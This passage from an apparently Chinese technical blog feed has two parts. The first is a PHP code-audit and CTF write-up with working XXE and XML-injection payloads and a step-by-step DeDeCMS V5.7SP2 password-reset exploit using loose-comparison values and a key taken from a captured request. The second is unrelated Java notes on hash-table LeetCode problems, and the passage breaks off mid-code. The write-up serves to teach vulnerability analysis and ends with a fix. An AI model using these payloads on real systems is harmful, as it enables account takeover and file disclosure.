invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>class_exists($classname)</code> 函数检查一个类是否已定义，这也会触发自动加载机制。</li><li>如果类存在，代码将使用动态传入的参数 <code>$param</code> 和 <code>$param2</code> 创建这个类的实例。</li><li>使用 <code>var_dump($newclass);</code> 输出新创建对象的详细信息。</li><li>使用 <code>foreach</code> 循环遍历对象的公开属性并打印它们。</li></ul><p>这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p><p>我们这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p><blockquote><p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p></blockquote><p>第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 <strong>FilesystemIterator::CURRENT_AS_FILEINFO</strong> ，其对应的常量值为0，你可以在 <a href="http://php.net/manual/en/globiterator.construct.php">这里</a> 找到这些常量的值，所以最终搜索文件的 <strong>payload</strong> 如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-24.png"><br>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt;   &gt;   &amp;   ‘   “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可，具体payload如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;</span>&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-23.png"><br>上面payload中的param2&#x3D;2，实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong> ，具体可以参考 <a href="http://php.net/manual/en/simplexmlelement.construct.php">这里</a> 。</p><h2 id="False-Beard"><a href="#False-Beard" class="headerlink" title="False Beard"></a>False Beard</h2><p>题目名字叫假胡子，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-25.png"><br><strong>题目解析：</strong><br>我们看到 <strong>第11行</strong> 和 <strong>第12行</strong> ，程序通过格式化字符串的方式，使用 <strong>xml</strong> 结构存储用户的登录信息。实际上这样很容易造成数据注入。然后 <strong>第21行</strong> 实例化 <strong>Login</strong> 类，并在 <strong>第16行</strong> 处调用 <strong>login</strong> 方法进行登陆操作。在进行登录操作之前，代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 <strong>&lt;** 和 **&gt;</strong> 符号，猜测开发者应该是考虑到非法字符注入问题。我们先来看一下 <strong>strpos</strong> 函数的定义：</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置<br>作用：主要是用来查找字符在字符串中首次出现的位置。<br>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-26.png"><br>在上面这个例子中，<strong>strpos</strong> 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 <strong>0</strong> ；如果搜索不到，则返回 <strong>false</strong> 。在这道题目中，开发者只考虑到 <strong>strpos</strong> 函数返回 <strong>false</strong> 的情况，却忽略了匹配到的字符在首位时会返回 <strong>0</strong> 的情况，因为 <strong>false</strong> 和 <strong>0</strong> 的取反均为 <strong>true</strong> 。这样我们就可以在用户名和密码首字符注入 <strong>&lt;</strong> 符号，从而注入xml数据。我们尝试使用以下 <strong>payload</strong> ，观察 <strong>strpos</strong> 函数的返回结果。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&lt;<span class="string">&quot;&gt;&lt;injected-tag%20property=&quot;</span>&amp;pass=&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-27.png"></p><p>如上图所示，很明显是可以注入xml数据的。</p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>实际上，本次漏洞是开发者对 <strong>strpos</strong> 函数理解不够，或者说是开发者考虑不周，导致过滤方法可被绕过。由于我们暂时没有在互联网上找到 <strong>strpos</strong> 使用不当导致漏洞的CMS案例，所以这里只能选取一个相似的漏洞进行分析，同样是开发者验证不够周全导致的漏洞。<br>本次案例，我们选取 <strong>DeDecms V5.7SP2正式版</strong> 进行分析，该CMS存在未修复的任意用户密码重置漏洞。漏洞的触发点在 <strong>member&#x2F;resetpassword.php</strong> 文件中，由于对接收的参数 <strong>safeanswer</strong> 没有进行严格的类型判断，导致可以使用弱类型比较绕过。我们来看看相关代码：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-28.png"><br>针对上面的代码做个分析，当 <strong>$dopost</strong> 等于 <strong>safequestion</strong> 的时候，通过传入的 <strong>$mid</strong> 对应的 <strong>id</strong> 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。跟进到 <strong>第11行</strong> ，当我们传入的问题和答案非空，而且等于之前设置的问题和答案，则进入 <strong>sn</strong> 函数。然而这里使用的是 <strong>&#x3D;&#x3D;</strong> 而不是 <strong>&#x3D;&#x3D;&#x3D;</strong> 来判断，所以是可以绕过的。假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 <strong>0</strong> ，答案的值为 <strong>null</strong> （这里是数据库中的值，即 <strong>$row[‘safequestion’]&#x3D;”0”</strong> 、 <strong>$row[‘safeanswer’]&#x3D;null</strong> ）。当没有设置 <strong>safequestion</strong> 和 <strong>safeanswer</strong> 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 <strong>if(‘0’ &#x3D;&#x3D; ‘’ &amp;&amp; null &#x3D;&#x3D; ‘’)</strong> ，即 <strong>if(false &amp;&amp; true)</strong> ，所以我们只要让表达式 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 为 <strong>true</strong> 即可。下图是 <strong>null &#x3D;&#x3D; ‘’</strong> 的判断结果：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-30.png"><br>我们可以利用 <strong>php弱类型</strong> 的特点，来绕过这里 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong> 的判断，如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-31.png"><br>通过测试找到了三个的payload，分别是 <strong>0.0</strong> 、 <strong>0.</strong> 、 <strong>0e1</strong> ，这三种类型payload均能使得 <strong>$row[‘safequestion’] &#x3D;&#x3D; $safequestion</strong>  为 <strong>true</strong> ，即成功进入 <strong>sn</strong> 函数。跟进 <strong>sn</strong> 函数，相关代码在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-32.png"><br>在 <strong>sn</strong> 函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向 <strong>newmail</strong> 函数。假设当前我们第一次进行忘记密码操作，那么此时的 <strong>$row</strong> 应该为空，所以进入第一个 <strong>if(!is_array($row))</strong> 分支，在 <strong>newmail</strong> 函数中执行 <strong>INSERT</strong> 操作，相关操作代码位置在 <strong>member&#x2F;inc&#x2F;inc_pwd_functions.php</strong> 文件中，关键代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-33.png"><br>该代码主要功能是发送邮件至相关邮箱，并且插入一条记录至 <strong>dede_pwd_tmp</strong> 表中。而恰好漏洞的触发点就在这里，我们看看 <strong>第13行</strong> 至 <strong>第18行</strong> 的代码，如果 <strong>($send &#x3D;&#x3D; ‘N’)</strong> 这个条件为真，通过 <strong>ShowMsg</strong> 打印出修改密码功能的链接。 <strong>第17行</strong> 修改密码链接中的 <strong>$mid</strong> 参数对应的值是用户id，而 <strong>$randval</strong> 是在第一次 <strong>insert</strong> 操作的时候将其 <strong>md5</strong> 加密之后插入到 <strong>dede_pwd_tmp</strong> 表中，并且在这里已经直接回显给用户。那么这里拼接的url其实是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&amp;id=$mid&amp;key=$randval</span><br></pre></td></tr></table></figure><p>继续跟进一下 <strong>dopost&#x3D;getpasswd</strong> 的操作，相关代码位置在 <strong>member&#x2F;resetpassword.php</strong> 中，<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-34.png"><br>在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 <strong>$row</strong> 不为空，则会执行以下操作内容，相关代码在 <strong>member&#x2F;resetpassword.php</strong> 中。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-36.png"><br>上图代码会先判断是否超时，如果没有超时，则进入密码修改页面。在密码修改页面会将 <strong>$setp</strong> 赋值为2。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-37.png"><br>由于现在的数据包中 <strong>$setp&#x3D;2</strong> ，因此这部分功能代码实现又回到了 <strong>member&#x2F;resetpassword.php</strong> 文件中。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-38.png"><br>上图代码 <strong>第6行</strong> 判断传入的 <strong>$key</strong> 是否等于数据库中的 <strong>$row[‘pwd’]</strong> ，如果相等就完成重置密码操作，至此也就完成了整个攻击的分析过程。</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>我们分别注册 <strong>test1</strong> ， <strong>test2</strong> 两个账号<br>第一步访问 <strong>payload</strong> 中的 <strong>url</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedecms/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;<span class="built_in">id</span>=9</span><br></pre></td></tr></table></figure><p>这里 <strong>test2</strong> 的id是9<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-39.png"><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-40.png"><br>通过抓包获取到 <strong>key</strong> 值。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-41.png"><br>去掉多余的字符访问修改密码链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.240/dedecms/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=OTyEGJtg</span><br></pre></td></tr></table></figure><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-42.png"><br>最后成功修改密码，我将密码修改成 <strong>123456</strong> ，数据库中 <strong>test2</strong> 的密码字段也变成了 <strong>123456</strong> 加密之后的值。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-43.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>针对上面 <strong>DeDecms任意用户密码重置</strong> 漏洞，我们只需要使用 <strong>&#x3D;&#x3D;&#x3D;</strong> 来代替 <strong>&#x3D;&#x3D;</strong> 就行了。因为 <strong>&#x3D;&#x3D;&#x3D;</strong> 操作会同时判断左右两边的值和数据类型是否相等，若有一个不等，即返回 <strong>false</strong> 。具体修复代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-44.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】哈希</title>
      <link href="/2024/09/30/algorithm/hash/"/>
      <url>/2024/09/30/algorithm/hash/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>一般哈希表都是用来快速判断一个元素是否出现集合里。要枚举的话时间复杂度是O(n)，但如果使用哈希表的话， 只需要O(1)就可以做到。将学生姓名映射到哈希表上就涉及到了hash function ，也就是哈希函数。<br><img src="/2024/09/30/algorithm/hash/image.png"><br>如果学生的数量大于哈希表的大小怎么办，此时就算哈希函数计算的再均匀，也避免不了会有几位学生的名字同时映射到哈希表 同一个索引下标的位置。</p><p>接下来哈希碰撞登场<br>拉链法：拉链法就是要选择适当的哈希表的大小，这样既不会因为数组空值而浪费大量内存，也不会因为链表太长而在查找上浪费太多时间。<br><img src="/2024/09/30/algorithm/hash/image-1.png"><br>线性探测法：使用线性探测法，一定要保证tableSize大于dataSize。 我们需要依靠哈希表中的空位来解决碰撞问题。例如冲突的位置，放了小李，那么就向下找一个空位放置小王的信息。所以要求tableSize一定要大于dataSize ，要不然哈希表上就没有空置的位置来存放 冲突的数据了。<br><img src="/2024/09/30/algorithm/hash/image-2.png"></p><p>当我们想使用哈希法来解决问题的时候，我们一般会选择如下三种数据结构。</p><ul><li>数组</li><li>set （集合）</li><li>map(映射)<br>当我们遇到了要快速判断一个元素是否出现集合里的时候，就要考虑哈希法。但是哈希法也是牺牲了空间换取了时间，因为我们要使用额外的数组，set或者是map来存放数据，才能实现快速的查找。如果在做面试题目的时候遇到需要判断一个元素是否出现过的场景也应该第一时间想到哈希法！</li></ul><h2 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242.有效的字母异位词"></a>242.有效的字母异位词</h2><p>给定两个字符串 s 和 t ，编写一个函数来判断 t 是否是 s 的 字母异位词。<br>示例 1:<br>输入: s &#x3D; “anagram”, t &#x3D; “nagaram”<br>输出: true</p><p>示例 2:<br>输入: s &#x3D; “rat”, t &#x3D; “car”<br>输出: false</p><p>数组其实就是一个简单哈希表，而且这道题目中字符串只有小写字符，那么就可以定义一个数组，来记录字符串s里字符出现的次数。需要定义一个多大的数组呢，定一个数组叫做record，大小为26 就可以了，初始化为0，因为字符a到字符z的ASCII也是26个连续的数值。<br>定义一个数组叫做record用来上记录字符串s里字符出现的次数。<br>需要把字符映射到数组也就是哈希表的索引下标上，因为字符a到字符z的ASCII是26个连续的数值，所以字符a映射为下标0，相应的字符z映射为下标25。<br>再遍历 字符串s的时候，只需要将 s[i] - ‘a’ 所在的元素做+1 操作即可，并不需要记住字符a的ASCII，只要求出一个相对数值就可以了。 这样就将字符串s中字符出现的次数，统计出来了。<br>那看一下如何检查字符串t中是否出现了这些字符，同样在遍历字符串t的时候，对t中出现的字符映射哈希表索引上的数值再做-1的操作。<br>那么最后检查一下，record数组如果有的元素不为零0，说明字符串s和t一定是谁多了字符或者谁少了字符，return false。<br>最后如果record数组所有元素都为零0，说明字符串s和t是字母异位词，return true。<br>时间复杂度为O(n)，空间上因为定义是的一个常量大小的辅助数组，所以空间复杂度为O(1)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            record[s.charAt(i) - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; t.length(); i++)&#123;</span><br><span class="line">            record[t.charAt(i) - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> count: record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(count != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以用排序的方法做</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAnagram</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.length() != t.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] str1 = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] str2 = t.toCharArray();</span><br><span class="line">        Arrays.sort(str1);</span><br><span class="line">        Arrays.sort(str2);</span><br><span class="line">        <span class="keyword">return</span> Arrays.equals(str1, str2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(nlogn)，其中 n 为 s 的长度。排序的时间复杂度为 O(nlogn)，比较两个字符串是否相等时间复杂度为 O(n)，因此总体时间复杂度为 O(nlogn+n)&#x3D;O(nlogn)。<br>空间复杂度：O(logn)。排序需要 O(logn) 的空间复杂度。注意，在某些语言（比如 Java &amp; JavaScript）中字符串是不可变的，因此我们需要额外的 O(n) 的空间来拷贝字符串。但是我们忽略这一复杂度分析，因为：这依赖于语言的细节，也取决于函数的设计方式，例如，可以将函数参数类型更改为 char[]。</p><h2 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349. 两个数组的交集"></a>349. 两个数组的交集</h2><p>给定两个数组 nums1 和 nums2 ，返回 它们的 交集。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序 。</p><ol><li>使用HashSet：计算两个数组的交集，直观的方法是遍历数组 nums1，对于其中的每个元素，遍历数组 nums2 判断该元素是否在数组 nums2 中，如果存在，则将该元素添加到返回值。假设数组 nums1 和 nums2 的长度分别是 m 和 n，则遍历数组 nums1 需要 O(m) 的时间，判断 nums1 中的每个元素是否在数组 nums2 中需要 O(n) 的时间，因此总时间复杂度是 O(mn)。<br>如果使用哈希集合存储元素，则可以在 O(1) 的时间内判断一个元素是否在集合中，从而降低时间复杂度。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; resSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历数组1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 遍历数组2看哈希表里是否有</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i))&#123;</span><br><span class="line">                resSet.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//方法1：将结果集合转为数组</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resSet.stream().mapToInt(x -&gt; x).toArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方法2：另外申请一个数组存放setRes中的元素,最后返回数组</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[resSet.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resSet)&#123;</span><br><span class="line">            arr[j++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>使用Hash数组<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2)&#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">                resList.add(i);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res[] = <span class="keyword">new</span> <span class="title class_">int</span>[resList.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : resList)</span><br><span class="line">            res[index++] = i;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>排序 + 双指针<br>如果两个数组是有序的，则可以使用双指针的方法得到两个数组的交集。<br>首先对两个数组进行排序，然后使用两个指针遍历两个数组。可以预见的是加入答案的数组的元素一定是递增的，为了保证加入元素的唯一性，我们需要额外记录变量 pre 表示上一次加入答案数组的元素。<br>初始时，两个指针分别指向两个数组的头部。每次比较两个指针指向的两个数组中的数字，如果两个数字不相等，则将指向较小数字的指针右移一位，如果两个数字相等，且该数字不等于 pre ，将该数字添加到答案并更新 pre 变量，同时将两个指针都右移一位。当至少有一个指针超出数组范围时，遍历结束。<br>时间复杂度：O(mlogm+nlogn)，其中 m 和 n 分别是两个数组的长度。对两个数组排序的时间复杂度分别是 O(mlogm) 和 O(nlogn)，双指针寻找交集元素的时间复杂度是 O(m+n)，因此总时间复杂度是 O(mlogm+nlogn)。<br>空间复杂度：O(logm+logn)，其中 m 和 n 分别是两个数组的长度。空间复杂度主要取决于排序使用的额外空间。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        Arrays.sort(nums1);</span><br><span class="line">        Arrays.sort(nums2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> nums1.length, length2 = nums2.length;</span><br><span class="line">        <span class="type">int</span>[] intersection = <span class="keyword">new</span> <span class="title class_">int</span>[length1 + length2];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>, index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index1 &lt; length1 &amp;&amp; index2 &lt; length2) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> nums1[index1], num2 = nums2[index2];</span><br><span class="line">            <span class="keyword">if</span> (num1 == num2) &#123;</span><br><span class="line">                <span class="comment">// 保证加入元素的唯一性</span></span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">0</span> || num1 != intersection[index - <span class="number">1</span>]) &#123;</span><br><span class="line">                    intersection[index++] = num1;</span><br><span class="line">                &#125;</span><br><span class="line">                index1++;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num1 &lt; num2) &#123;</span><br><span class="line">                index1++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                index2++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOfRange(intersection, <span class="number">0</span>, 